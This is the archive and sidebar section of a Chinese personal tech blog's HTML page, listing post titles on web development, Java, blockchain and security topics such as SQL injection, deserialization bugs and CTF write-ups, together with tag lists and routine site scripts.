            <span class="archive-post-date">01/23</span>
            <a class="archive-post-title" href="/posts/27875254.html">Spring持久层技术-Sping Data JPA使用及总结（一）</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">01/14</span>
            <a class="archive-post-title" href="/posts/bec529bf.html">以太坊智能合约开发环境搭建及智能合约的编写、部署、测试</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">01/11</span>
            <a class="archive-post-title" href="/posts/2ff8a9fd.html">以太坊基本概念与实验环境搭建</a>
        </li>
    
        
            
            
                
                </ul>
            
            <div class="archive-year"> 2020 </div>
            <ul class="year-list">
            
        
        <li class="archive-post-item">
            <span class="archive-post-date">06/17</span>
            <a class="archive-post-title" href="/posts/bcd864e2.html">DC-1靶机渗透</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">05/31</span>
            <a class="archive-post-title" href="/posts/c99165fd.html">fastjson反序列化漏洞学习（一）</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">05/09</span>
            <a class="archive-post-title" href="/posts/a9e6a25b.html">Spring基础学习 - AOP机制</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">05/06</span>
            <a class="archive-post-title" href="/posts/b92dbb83.html">JavaEE基础 - Servlet</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">05/06</span>
            <a class="archive-post-title" href="/posts/44088610.html">Spring基础学习 - IOC机制</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">05/01</span>
            <a class="archive-post-title" href="/posts/662e1cfe.html">微服务入门-5W和微服务思想</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">04/22</span>
            <a class="archive-post-title" href="/posts/c75c5fc7.html">Java 反序列化漏洞与JNDI注入(下)</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">04/14</span>
            <a class="archive-post-title" href="/posts/5dcfa8b5.html">Kerberos认证过程原理及攻击手段</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">02/26</span>
            <a class="archive-post-title" href="/posts/1ccc94ff.html">内存布局与栈溢出&堆溢出原理</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">02/21</span>
            <a class="archive-post-title" href="/posts/bc7cb7a1.html">入坑Pwn之刷题补坑</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">01/29</span>
            <a class="archive-post-title" href="/posts/760e25d9.html">内存取证原理学习及Volatility - 篇二</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">01/22</span>
            <a class="archive-post-title" href="/posts/b0024cb7.html">Struts框架管窥以及几个漏洞的分析</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">01/09</span>
            <a class="archive-post-title" href="/posts/8ce0a80d.html">Redis未授权访问漏洞及修补方法</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">01/08</span>
            <a class="archive-post-title" href="/posts/13fe3d9f.html">本地提权与漏洞提权</a>
        </li>
    
        
            
            
                
                </ul>
            
            <div class="archive-year"> 2019 </div>
            <ul class="year-list">
            
        
        <li class="archive-post-item">
            <span class="archive-post-date">12/21</span>
            <a class="archive-post-title" href="/posts/f8b67901.html">逆向工程课程小结</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">12/08</span>
            <a class="archive-post-title" href="/posts/4d8e0b70.html">内存取证原理学习及Volatility - 篇一</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">10/20</span>
            <a class="archive-post-title" href="/posts/82490df7.html">并发模型之单线程多路I/O复用---select</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">09/29</span>
            <a class="archive-post-title" href="/posts/a715340f.html">入坑Pwn之基本知识</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">09/10</span>
            <a class="archive-post-title" href="/posts/47dcecb9.html">Apache-Commons-Collections反序列化漏洞</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">09/03</span>
            <a class="archive-post-title" href="/posts/de476e86.html">Java 反序列化漏洞与JNDI注入(上)</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">08/20</span>
            <a class="archive-post-title" href="/posts/7a9a17f3.html">记录一次对win2k3 Enterprise Edition的永恒之蓝利用</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">05/11</span>
            <a class="archive-post-title" href="/posts/6f24bb1d.html">kali-渗透测试-信息收集3</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">05/10</span>
            <a class="archive-post-title" href="/posts/18238b8b.html">kali-渗透测试-信息收集2</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">03/18</span>
            <a class="archive-post-title" href="/posts/812ada31.html">kali-渗透测试-信息收集1</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">02/11</span>
            <a class="archive-post-title" href="/posts/fffcd997.html">Metasploit渗透测试魔鬼训练营-客户端渗透攻击</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">02/10</span>
            <a class="archive-post-title" href="/posts/30b79e7d.html">Metasploit渗透测试魔鬼训练营-Windows服务漏洞MS08-067实战与分析总结</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">02/07</span>
            <a class="archive-post-title" href="/posts/79017d0.html">Metasploit渗透测试魔鬼训练营-web应用渗透</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">02/06</span>
            <a class="archive-post-title" href="/posts/6c9a4aca.html">Metasploit渗透测试魔鬼训练营-服务扫描与查点</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">02/04</span>
            <a class="archive-post-title" href="/posts/ed61533c.html">Metasploit渗透测试魔鬼训练营-信息收集</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">01/22</span>
            <a class="archive-post-title" href="/posts/ba8e1564.html">Metasploit渗透测试魔鬼训练营 第一天</a>
        </li>
    
        
            
            
                
                </ul>
            
            <div class="archive-year"> 2018 </div>
            <ul class="year-list">
            
        
        <li class="archive-post-item">
            <span class="archive-post-date">12/28</span>
            <a class="archive-post-title" href="/posts/dd591816.html">小明的博客--Typecho 反序列化漏洞</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">12/10</span>
            <a class="archive-post-title" href="/posts/41159e88.html">Bugku的一道注入---多次</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">12/06</span>
            <a class="archive-post-title" href="/posts/26bacf07.html">Bugku的一道注入--INSERT INTO注入</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">11/26</span>
            <a class="archive-post-title" href="/posts/e1cf93ae.html">ThinkPHP框架学习---路由</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">11/25</span>
            <a class="archive-post-title" href="/posts/dec252e7.html">ThinkPHP框架学习---config类和config助手函数</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">11/25</span>
            <a class="archive-post-title" href="/posts/8405173.html">ThinkPHP框架学习---框架目录及框架配置</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">11/19</span>
            <a class="archive-post-title" href="/posts/5d13a793.html">Nmap使用指南</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">11/12</span>
            <a class="archive-post-title" href="/posts/e6caa5f0.html">SQL注入小记(二)</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">11/09</span>
            <a class="archive-post-title" href="/posts/78f948a4.html">PHP学习--超级全局变量</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">11/08</span>
            <a class="archive-post-title" href="/posts/777d53bb.html">PHP学习--变量</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">11/03</span>
            <a class="archive-post-title" href="/posts/f0bc436c.html">PHP框架MVC学习</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">10/30</span>
            <a class="archive-post-title" href="/posts/117580c0.html">CTF中的python脚本题小结（二）</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">10/30</span>
            <a class="archive-post-title" href="/posts/21636c18.html">CTF中的python脚本题小结（一）</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">10/20</span>
            <a class="archive-post-title" href="/posts/fc74b0ce.html">Hackergame 2018 wp</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">09/25</span>
            <a class="archive-post-title" href="/posts/8c800523.html">安恒九月题的misc和一道web</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">09/10</span>
            <a class="archive-post-title" href="/posts/49fb3e92.html">SQL注入小记(一)</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">08/27</span>
            <a class="archive-post-title" href="/posts/21c35507.html">隐写术-LSB隐写</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">08/26</span>
            <a class="archive-post-title" href="/posts/59bc0c0.html">隐写术--NTFS流隐写</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">08/25</span>
            <a class="archive-post-title" href="/posts/c7cffe19.html">CTF常见隐写手段小结</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">08/22</span>
            <a class="archive-post-title" href="/posts/69896e9f.html">DOM 文档对象模型</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">08/21</span>
            <a class="archive-post-title" href="/posts/20cf0786.html">BOM-浏览器操作对象模型之history和screen对象</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">08/20</span>
            <a class="archive-post-title" href="/posts/f92f304f.html">BOM 浏览器操作对象模型之navigator、location对象</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">08/18</span>
            <a class="archive-post-title" href="/posts/79f16c6a.html">BOM-浏览器操作对象模型之window对象</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">08/16</span>
            <a class="archive-post-title" href="/posts/aa0a7b0a.html">Javascript基础之数据类型2</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">08/15</span>
            <a class="archive-post-title" href="/posts/33032ab0.html">Javascript基础之数据类型1</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">08/12</span>
            <a class="archive-post-title" href="/posts/b5fac929.html">CTF隐写术--关于ZIP</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">08/09</span>
            <a class="archive-post-title" href="/posts/98736a90.html">CSS样式基础4.4--选择器之伪类选择器</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">08/08</span>
            <a class="archive-post-title" href="/posts/17442633.html">Bugku的一道misc-----猫片</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">08/08</span>
            <a class="archive-post-title" href="/posts/d4db3e56.html">CSS基础4.3--选择器之属性选择器</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">08/05</span>
            <a class="archive-post-title" href="/posts/7b6c38ce.html">CSS基础4.2--选择器之组合选择器</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">08/03</span>
            <a class="archive-post-title" href="/posts/6027632.html">CSS基础4.1--选择器之CSS基础4.1-选择器之基本选择器</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">08/02</span>
            <a class="archive-post-title" href="/posts/370eaad5.html">CSS基础3.2--特性之CSS基础3.2--特性之继承性</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">08/01</span>
            <a class="archive-post-title" href="/posts/4655c16f.html">CSS基础3.1--特性之CSS基础3.1-特性之层叠性</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">08/01</span>
            <a class="archive-post-title" href="/posts/ae68c748.html">CSS基础2--CSS基础2-应用</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">08/01</span>
            <a class="archive-post-title" href="/posts/6b427aa1.html">CSS基础1--样式</a>
        </li>
    
    </div>
</div>

        <div class="sidebar-panel-tags">
    <div class="sidebar-tags-name">
        
            <span class="sidebar-tag-name" data-tags="渗透测试">
                <span class="iconfont-archer">&#xe606;</span>
                渗透测试
            </span>
        
            <span class="sidebar-tag-name" data-tags="Java">
                <span class="iconfont-archer">&#xe606;</span>
                Java
            </span>
        
            <span class="sidebar-tag-name" data-tags="漏洞分析">
                <span class="iconfont-archer">&#xe606;</span>
                漏洞分析
            </span>
        
            <span class="sidebar-tag-name" data-tags="前端">
                <span class="iconfont-archer">&#xe606;</span>
                前端
            </span>
        
            <span class="sidebar-tag-name" data-tags="Go语言">
                <span class="iconfont-archer">&#xe606;</span>
                Go语言
            </span>
        
            <span class="sidebar-tag-name" data-tags="Go Web">
                <span class="iconfont-archer">&#xe606;</span>
                Go Web
            </span>
        
            <span class="sidebar-tag-name" data-tags="论文阅读">
                <span class="iconfont-archer">&#xe606;</span>
                论文阅读
            </span>
        
            <span class="sidebar-tag-name" data-tags="开发技术">
                <span class="iconfont-archer">&#xe606;</span>
                开发技术
            </span>
        
            <span class="sidebar-tag-name" data-tags="CTF">
                <span class="iconfont-archer">&#xe606;</span>
                CTF
            </span>
        
            <span class="sidebar-tag-name" data-tags="SQL注入">
                <span class="iconfont-archer">&#xe606;</span>
                SQL注入
            </span>
        
            <span class="sidebar-tag-name" data-tags="CSS">
                <span class="iconfont-archer">&#xe606;</span>
                CSS
            </span>
        
            <span class="sidebar-tag-name" data-tags="隐写术">
                <span class="iconfont-archer">&#xe606;</span>
                隐写术
            </span>
        
            <span class="sidebar-tag-name" data-tags="python">
                <span class="iconfont-archer">&#xe606;</span>
                python
            </span>
        
            <span class="sidebar-tag-name" data-tags="web安全">
                <span class="iconfont-archer">&#xe606;</span>
                web安全
            </span>
        
            <span class="sidebar-tag-name" data-tags="云技术">
                <span class="iconfont-archer">&#xe606;</span>
                云技术
            </span>
        
            <span class="sidebar-tag-name" data-tags="DevOps">
                <span class="iconfont-archer">&#xe606;</span>
                DevOps
            </span>
        
            <span class="sidebar-tag-name" data-tags="开发与运维">
                <span class="iconfont-archer">&#xe606;</span>
                开发与运维
            </span>
        
            <span class="sidebar-tag-name" data-tags="网络编程">
                <span class="iconfont-archer">&#xe606;</span>
                网络编程
            </span>
        
            <span class="sidebar-tag-name" data-tags="分布式技术">
                <span class="iconfont-archer">&#xe606;</span>
                分布式技术
            </span>
        
            <span class="sidebar-tag-name" data-tags="Kubernete">
                <span class="iconfont-archer">&#xe606;</span>
                Kubernete
            </span>
        
            <span class="sidebar-tag-name" data-tags="MatLab">
                <span class="iconfont-archer">&#xe606;</span>
                MatLab
            </span>
        
            <span class="sidebar-tag-name" data-tags="PHP">
                <span class="iconfont-archer">&#xe606;</span>
                PHP
            </span>
        
            <span class="sidebar-tag-name" data-tags="Quarkus">
                <span class="iconfont-archer">&#xe606;</span>
                Quarkus
            </span>
        
            <span class="sidebar-tag-name" data-tags="Spring">
                <span class="iconfont-archer">&#xe606;</span>
                Spring
            </span>
        
            <span class="sidebar-tag-name" data-tags="NodeJS">
                <span class="iconfont-archer">&#xe606;</span>
                NodeJS
            </span>
        
            <span class="sidebar-tag-name" data-tags="express">
                <span class="iconfont-archer">&#xe606;</span>
                express
            </span>
        
            <span class="sidebar-tag-name" data-tags="docker">
                <span class="iconfont-archer">&#xe606;</span>
                docker
            </span>
        
            <span class="sidebar-tag-name" data-tags="密码学">
                <span class="iconfont-archer">&#xe606;</span>
                密码学
            </span>
        
            <span class="sidebar-tag-name" data-tags="区块链技术">
                <span class="iconfont-archer">&#xe606;</span>
                区块链技术
            </span>
        
            <span class="sidebar-tag-name" data-tags="以太坊">
                <span class="iconfont-archer">&#xe606;</span>
                以太坊
            </span>
        
            <span class="sidebar-tag-name" data-tags="智能合约">
                <span class="iconfont-archer">&#xe606;</span>
                智能合约
            </span>
        
            <span class="sidebar-tag-name" data-tags="pwn">
                <span class="iconfont-archer">&#xe606;</span>
                pwn
            </span>
        
            <span class="sidebar-tag-name" data-tags="电子取证">
                <span class="iconfont-archer">&#xe606;</span>
                电子取证
            </span>
        
            <span class="sidebar-tag-name" data-tags="C编程">
                <span class="iconfont-archer">&#xe606;</span>
                C编程
            </span>
        
            <span class="sidebar-tag-name" data-tags="课程总结">
                <span class="iconfont-archer">&#xe606;</span>
                课程总结
            </span>
        
            <span class="sidebar-tag-name" data-tags="DevSecOps">
                <span class="iconfont-archer">&#xe606;</span>
                DevSecOps
            </span>
        
            <span class="sidebar-tag-name" data-tags="云安全">
                <span class="iconfont-archer">&#xe606;</span>
                云安全
            </span>
        
            <span class="sidebar-tag-name" data-tags="微服务技术">
                <span class="iconfont-archer">&#xe606;</span>
                微服务技术
            </span>
        
    </div>
    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
        缺失模块，请参考主题文档进行安装配置：https://github.com/fi3ework/hexo-theme-archer#%E5%AE%89%E8%A3%85%E4%B8%BB%E9%A2%98
    </div> 
    <div class="sidebar-tags-list"></div>
</div>

        <div class="sidebar-panel-categories">
    <div class="sidebar-categories-name">
    
        <span class="sidebar-category-name" data-categories="漏洞分析">
            <span class="iconfont-archer">&#xe60a;</span>
            漏洞分析
        </span>
    
        <span class="sidebar-category-name" data-categories="开发技术">
            <span class="iconfont-archer">&#xe60a;</span>
            开发技术
        </span>
    
        <span class="sidebar-category-name" data-categories="论文阅读">
            <span class="iconfont-archer">&#xe60a;</span>
            论文阅读
        </span>
    
        <span class="sidebar-category-name" data-categories="CTF">
            <span class="iconfont-archer">&#xe60a;</span>
            CTF
        </span>
    
        <span class="sidebar-category-name" data-categories="渗透测试">
            <span class="iconfont-archer">&#xe60a;</span>
            渗透测试
        </span>
    
        <span class="sidebar-category-name" data-categories="MATLAB">
            <span class="iconfont-archer">&#xe60a;</span>
            MATLAB
        </span>
    
        <span class="sidebar-category-name" data-categories="密码学">
            <span class="iconfont-archer">&#xe60a;</span>
            密码学
        </span>
    
        <span class="sidebar-category-name" data-categories="区块链技术">
            <span class="iconfont-archer">&#xe60a;</span>
            区块链技术
        </span>
    
        <span class="sidebar-category-name" data-categories="电子取证">
            <span class="iconfont-archer">&#xe60a;</span>
            电子取证
        </span>
    
        <span class="sidebar-category-name" data-categories="杂谈">
            <span class="iconfont-archer">&#xe60a;</span>
            杂谈
        </span>
    
        <span class="sidebar-category-name" data-categories="课程总结">
            <span class="iconfont-archer">&#xe60a;</span>
            课程总结
        </span>
    
        <span class="sidebar-category-name" data-categories="DevSecOps">
            <span class="iconfont-archer">&#xe60a;</span>
            DevSecOps
        </span>
    
        <span class="sidebar-category-name" data-categories="云安全">
            <span class="iconfont-archer">&#xe60a;</span>
            云安全
        </span>
    
    </div>
    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
    <div class="sidebar-categories-list"></div>
</div>

    </div>
</div>

        <!-- site-meta -->
        <script>
    var siteMetaRoot = "/"
    if (siteMetaRoot === "undefined") {
        siteMetaRoot = '/'
    }
    var siteMeta = {
        url: "https://lzwgiter.github.io",
        root: siteMetaRoot,
        author: "f10@t"
    }
</script>

        <!-- import experimental options here -->
        <!-- Custom Font -->


        <!-- main func -->
        <script src="/scripts/main.js?v=20211217"></script>
        <!-- dark mode -->
        <script src="/scripts/dark.js?v=20211217"></script>
        <!-- fancybox -->
        <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" defer></script>
        <!-- algolia -->
        
        <!-- busuanzi -->
        
            <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
        
        <!-- CNZZ -->
        
        <!-- async load share.js -->
        
            <script src="/scripts/share.js?v=20211217" async></script>
        
        <!-- mermaid -->
        
    </body>
</html>
